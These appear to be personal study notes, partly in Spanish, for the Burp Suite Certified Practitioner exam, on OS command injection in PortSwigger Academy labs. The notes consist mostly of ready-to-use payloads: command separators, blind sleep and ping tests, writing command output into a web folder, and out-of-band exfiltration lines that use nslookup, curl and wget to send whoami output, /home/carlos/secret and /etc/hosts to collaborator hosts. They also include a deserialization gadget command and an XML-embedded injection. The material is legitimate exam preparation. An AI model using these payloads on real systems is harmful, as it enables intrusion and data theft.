Simple
```
|| command
; command
&& command (url-encoded)
$(command)
```

Blind
```
test%40test.com||sleep+5||
test%40test.com;sleep+5;
test%40test.com||ping+-c+5||
;nslookup x.e4jthuf7rticd8sp14hova2fw62xqnec.oastify.com;
```

Write commands in accesible folder: /var/www/images/
```
whoami > /var/www/images/test.txt

https://0a2f008a032675868187b28600ba00d0.web-security-academy.net/image?filename=test.txt
```

Exfiltrate data with out of band
```
;nslookup $(whoami).e4jthuf7rticd8sp14hova2fw62xqnec.oastify.com;
||curl+`whoami`.00y7e29ks339nxuskhes4q429tfk3br0.oastify.com||
```
![[Pasted image 20260721135516.png]]

## Exfiltrando datos como un pro: 

> ATENCIÓN: Si tienes la respuesta correcta con email=||curl+burp.oastify.com?c=`whoami`|| payload EN LOS LABS y no conoces ninguna otra - fallarás este paso en el examen. tengo un conocido que su primer intento de examen lo falló sólo por esa mondá. un  payload (que le funcionó en el laboratorio) y no funcionó en el examen. Por favor, aprende que puedes exfiltrar datos como parte de tu subdominio colaborador burp, como: 

```js
	nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com
	||wget --post-file /etc/hosts https://COLLAB.oastify.com||
```

	payload, incluso, si solo obtienes callbacks DNS.

#### EJEMPLOS UTILES PARA LA BSCP: 

---

```js
//posiblemente para un caso de deserializacion insegura. 

"``/usr/bin/wget --post-file /home/carlos/secret https://y54nvieai2tvgmz11xb2hj1pkgq9e12q.oastify.com``"

CommonsCollections7 'curl --data @/home/carlos/secret <your burp collaborator address>'

```

> BASH os command execution en el submit feedback posiblemente en la seccion de email, toca probar todos los demás endpoints centrandonos en un insertion point selected obvio. 

```shell
email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
```

```js
||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||
```

> XML and OS Command execution

```js
<email>user16@exploit-server.net||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||</email>
```
